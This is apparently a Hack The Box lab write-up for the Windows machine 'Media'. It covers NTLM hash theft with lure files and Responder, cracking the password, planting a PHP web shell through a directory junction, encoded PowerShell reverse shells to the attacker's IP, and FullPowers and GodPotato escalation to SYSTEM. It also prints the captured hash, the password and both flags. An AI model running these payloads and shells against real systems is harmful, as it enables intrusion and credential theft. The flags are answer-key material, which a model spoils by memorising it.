---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - NTLM_Theft
  - Responder
  - SeImpersonatePrivilege
  - Symlink
  - GodPotato
  - FullPowers
---
# Overview

| Name        | Media       |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.234.67 -T4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 15:30 CDT
Nmap scan report for 10.129.234.67
Host is up (0.082s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-14T20:31:17+00:00; +24s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2025-10-13T20:29:40
|_Not valid after:  2026-04-14T20:29:40
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-14T20:31:12+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 23s, deviation: 0s, median: 23s
```

![[media.png]]
# Initial Foothold
## NTLM_Theft

We can use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) tool.

```bash
$ git clone https://github.com/Greenwolf/ntlm_theft
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 151, done.
remote: Counting objects: 100% (44/44), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 151 (delta 23), reused 15 (delta 9), pack-reused 107 (from 1)
Receiving objects: 100% (151/151), 2.13 MiB | 42.69 MiB/s, done.
Resolving deltas: 100% (71/71), done.
$ cd ntlm_theft/
$ python3 ntlm_theft.py -g all -s 10.10.14.122 -f media
Created: media/media.scf (BROWSE TO FOLDER)
Created: media/media-(url).url (BROWSE TO FOLDER)
Created: media/media-(icon).url (BROWSE TO FOLDER)
Created: media/media.lnk (BROWSE TO FOLDER)
Created: media/media.rtf (OPEN)
Created: media/media-(stylesheet).xml (OPEN)
Created: media/media-(fulldocx).xml (OPEN)
Created: media/media.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: media/media-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: media/media-(includepicture).docx (OPEN)
Created: media/media-(remotetemplate).docx (OPEN)
Created: media/media-(frameset).docx (OPEN)
Created: media/media-(externalcell).xlsx (OPEN)
Created: media/media.wax (OPEN)
Created: media/media.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: media/media.asx (OPEN)
Created: media/media.jnlp (OPEN)
Created: media/media.application (DOWNLOAD AND OPEN)
Created: media/media.pdf (OPEN AND ALLOW)
Created: media/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: media/media.library-ms (BROWSE TO FOLDER)
Created: media/Autorun.inf (BROWSE TO FOLDER)
Created: media/desktop.ini (BROWSE TO FOLDER)
Created: media/media.theme (THEME TO INSTALL
Generation Complete.
```

![[media2.png]]

Upload and wait in responder for HR to see it.

```bash
$ sudo responder -I tun0

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:fc27b3d916c4c6e4:55C43F82867E40DEA5EC7F942DF18440:0101000000000000808C3262203DDC010A3CAF1E4436F8EC0000000002000800570035005600460001001E00570049004E002D003700340053005400370053004100490036005A00520004003400570049004E002D003700340053005400370053004100490036005A0052002E0057003500560046002E004C004F00430041004C000300140057003500560046002E004C004F00430041004C000500140057003500560046002E004C004F00430041004C0007000800808C3262203DDC01060004000200000008003000300000000000000000000000003000004F6ECCBBD7638104A14916F20267282B989D5EB78A7F59E360B872F921713CB00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320032000000000000000000
[*] Skipping previously captured hash for MEDIA\enox
```

```bash
hashcat -m 5600 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
```

We get pass `1234virus@`.

```bash
$ ssh enox@media.htb
The authenticity of host 'media.htb (10.129.234.67)' can't be established.
ED25519 key fingerprint is SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'media.htb' (ED25519) to the list of known hosts.
enox@media.htb's password: 

Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

```powershell
PS C:\Users\enox\Desktop> ls


    Directory: C:\Users\enox\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/14/2025   1:30 PM             34 user.txt


PS C:\Users\enox\Desktop> cat .\user.txt
949cb020fe287455cc6f60313944ffe5
```
# Lateral Movement

```powershell
PS C:\Users\enox\Documents> ls


    Directory: C:\Users\enox\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         10/2/2023   6:00 PM           2841 review.ps1      


PS C:\Users\enox\Documents> cat .\review.ps1
function Get-Values {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]     
        [string]$FilePath
    )

    # Read the first line of the file
    $firstLine = Get-Content $FilePath -TotalCount 1

    # Extract the values from the first line
    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {
        $filename = $Matches[1]
        $randomVariable = $Matches[2]

        # Create a custom object with the extracted values        
        $repoValues = [PSCustomObject]@{
            FileName = $filename
            RandomVariable = $randomVariable
        }

        # Return the custom object
        return $repoValues
    }
    else {
        # Return $null if the pattern is not found
        return $null
    }
}

function UpdateTodo {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]     
        [string]$FilePath
    )

    # Create a .NET stream reader and writer
    $reader = [System.IO.StreamReader]::new($FilePath)
    $writer = [System.IO.StreamWriter]::new($FilePath + ".tmp")   

    # Read the first line and ignore it
    $reader.ReadLine() | Out-Null

    # Copy the remaining lines to a temporary file
    while (-not $reader.EndOfStream) {
        $line = $reader.ReadLine()
        $writer.WriteLine($line)
    }

    # Close the reader and writer
    $reader.Close()
    $writer.Close()

    # Replace the original file with the temporary file
    Remove-Item $FilePath
    Rename-Item -Path ($FilePath + ".tmp") -NewName $FilePath     
}

$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"


while($True){

    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60 # Sleep for 60 seconds before rechecking
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable
        Write-Host "FileName: $filename"
        Write-Host "Random Variable: $randomVariable"

        # Opening the File in Windows Media Player
        Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"

        # Wait for 15 seconds
        Start-Sleep -Seconds 15

        $mediaPlayerProcess = Get-Process -Name "wmplayer" -ErrorAction SilentlyContinue
        if ($mediaPlayerProcess -ne $null) {
            Write-Host "Killing Windows Media Player process."    
            Stop-Process -Name "wmplayer" -Force
        }

        # Task Done
        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt
        Sleep 15
    }

}
```

- **Monitors**: `C:\Windows\Tasks\Uploads\todo.txt` every 60 seconds
- **Parses**: First line for filename and folder name
- **Plays**: Files in Windows Media Player from `C:\Windows\Tasks\uploads\[folder]\[filename]`
- **Kills**: Media Player after 15 seconds
- **Cleans**: Removes the processed task from todo.txt

It **automatically executes any file** specified in the todo.txt through Windows Media Player. This allows attackers to:

- Run malicious files automatically
- Exploit Media Player vulnerabilities
- Abuse the script's likely higher privileges (since it runs from `C:\Windows\Tasks\`
## Symlink Exploitation

```powershell
PS C:\Users\enox\Documents> cd C:\Windows\Tasks\Uploads\    
PS C:\Windows\Tasks\Uploads> ls


    Directory: C:\Windows\Tasks\Uploads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/14/2025   1:38 PM                4e422e23b6f3750 
                                                  cea2a3f773517e8 
                                                  83
-a----        10/14/2025   1:39 PM              0 todo.txt        
```

That is hash of malicious file we had uploaded to get the responder hash.

```powershell
PS C:\Windows\Tasks\Uploads> rmdir 4e422e23b6f3750cea2a3f773517e883

Confirm
The item at 
C:\Windows\Tasks\Uploads\4e422e23b6f3750cea2a3f773517e883 has     
children and the Recurse parameter was not specified. If you      
continue, all children will be removed with the item. Are you     
sure you want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend       
[?] Help(default is "Y"): y
```

```bash
$ cat << 'EOF' > cmd.php
<?php system($_GET['cmd']); ?>
EOF
```

Now again from site `media.htb` upload this web shell.

```powershell
PS C:\Windows\Tasks\Uploads> dir


    Directory: C:\Windows\Tasks\Uploads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/15/2025  12:02 AM                2a57bded90aed41 
                                                  7a29f90960cc771 
                                                  6e
-a----        10/15/2025  12:02 AM             69 todo.txt        


PS C:\Windows\Tasks\Uploads> rmdir .\2a57bded90aed417a29f90960cc7716e\

Confirm
The item at
C:\Windows\Tasks\Uploads\2a57bded90aed417a29f90960cc7716e\ has    
children and the Recurse parameter was not specified. If you      
continue, all children will be removed with the item. Are you     
sure you want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend       
[?] Help(default is "Y"): y
```

After removing it add a symlink so our uploaded file `cmd.php` next time gets to root directory (`c:\xampp\htdocs`) and runs with that privielege. 

```powershell
PS C:\Windows\Tasks\Uploads> cmd /c mklink /J C:\Windows\Tasks\Uploads\2a57bded90aed417a29f90960cc7716e C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\2a57bded90aed417a29f90960cc7716e <<===>> C:\xampp\htdocs
```

Now again upload that `cmd.php` with same name and last name and mail (hash will be same like this) in `media.htb`.

```powershell
PS C:\Windows\Tasks\Uploads> dir                                  


    Directory: C:\Windows\Tasks\Uploads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----l        10/15/2025  12:02 AM                2a57bded90aed41 
                                                  7a29f90960cc771 
                                                  6e
-a----        10/15/2025  12:04 AM             69 todo.txt        


PS C:\Windows\Tasks\Uploads> Get-ChildItem C:\xampp\htdocs\cmd.php    

                                                                     Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/15/2025  12:04 AM             26 cmd.php
```

We see now that our `cmd.php` is automatically uploaded into webroot i.e `c:\xampp\htdocs` which is due to our symlink.

```bash
$ curl "http://media.htb/cmd.php?cmd=whoami"
nt authority\local service
```

Generate [revshell](https://www.revshells.com/).

```bash
$ curl "http://media.htb/cmd.php" --get --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

```bash
$ rlwrap nc -nlvp 10001
listening on [any] 10001 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.234.67] 49386
whoami
nt authority\local service
PS C:\xampp\htdocs> 
```
# Privilege Escalation
## FullPowers 

```powershell
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

There’s a nice tool, [FullPowers](https://github.com/itm4n/FullPowers), designed to restore the default privilege set for the account by creating a scheduled task and running it. I’ll download a copy from the [release page](https://github.com/itm4n/FullPowers/releases/) and upload it to Media using `scp`:

```bash
$ sshpass -p '1234virus@' scp FullPowers.exe enox@media.htb:/programdata/
```

Now I just run it with the `-c` option and a reverse shell, and the `-z` option for non-interactive (Do on that where you got `nt authority\local service` reverse shell ):

```powershell
$ rlwrap nc -nlvp 10001
listening on [any] 10001 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.234.67] 49387

PS C:\xampp\htdocs> cd /programdata
PS C:\programdata> ls


    Directory: C:\programdata


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        10/10/2023   6:41 AM                Amazon                                                               
d---s-         10/1/2023  11:45 PM                Microsoft                                                            
d-----         4/15/2025   9:08 PM                Package Cache                                                        
d-----         8/26/2025  12:58 PM                Packages                                                             
d-----        10/10/2023   3:55 AM                regid.1991-06.com.microsoft                                          
d-----          5/8/2021   1:20 AM                SoftwareDistribution                                                 
d-----         8/27/2025   7:04 AM                ssh                                                                  
d-----         10/2/2023  10:33 AM                USOPrivate                                                           
d-----          5/8/2021   1:20 AM                USOShared                                                            
d-----         10/2/2023  12:18 AM                VMware                                                               
-a----        10/15/2025  12:31 AM          36864 FullPowers.exe                                                       


PS C:\programdata> .\FullPowers.exe -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADgAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA' -z
```
## `SeImpersonatePrivilege` GodPotato

```powershell
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.234.67] 49388

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

To exploit `SeImpersonatePrivilege`, I’ll use [GodPotato](https://github.com/BeichenDream/GodPotato). I’ll download the latest release and upload it to Media:

```bash
$ sshpass -p '1234virus@' scp GodPotato-NET4.exe enox@media.htb:/programdata/gp.exe
```

```powershell
PS C:\Windows\system32> cd c:\programdata
PS C:\programdata> ls


    Directory: C:\programdata


Mode                 LastWriteTime         Length Name                                            
----                 -------------         ------ ----                                            
d-----        10/10/2023   6:41 AM                Amazon                                          
d---s-         10/1/2023  11:45 PM                Microsoft                                       
d-----         4/15/2025   9:08 PM                Package Cache                                   
d-----         8/26/2025  12:58 PM                Packages                                        
d-----        10/10/2023   3:55 AM                regid.1991-06.com.microsoft                     
d-----          5/8/2021   1:20 AM                SoftwareDistribution                            
d-----         8/27/2025   7:04 AM                ssh                                             
d-----         10/2/2023  10:33 AM                USOPrivate                                      
d-----          5/8/2021   1:20 AM                USOShared                                       
d-----         10/2/2023  12:18 AM                VMware                                          
-a----        10/15/2025  12:31 AM          36864 FullPowers.exe                                  
-a----        10/15/2025  12:37 AM          57344 gp.exe                                          


PS C:\programdata> .\gp.exe -cmd 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADgAIgAsADUANQA1ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

```bash
$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.234.67] 49392

PS C:\programdata> whoami
nt authority\system
PS C:\programdata> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
PS C:\programdata> cat C:\Users\Administrator\Desktop\root.txt
771319541e11a4ae9868006ecbae6fb9
```

---
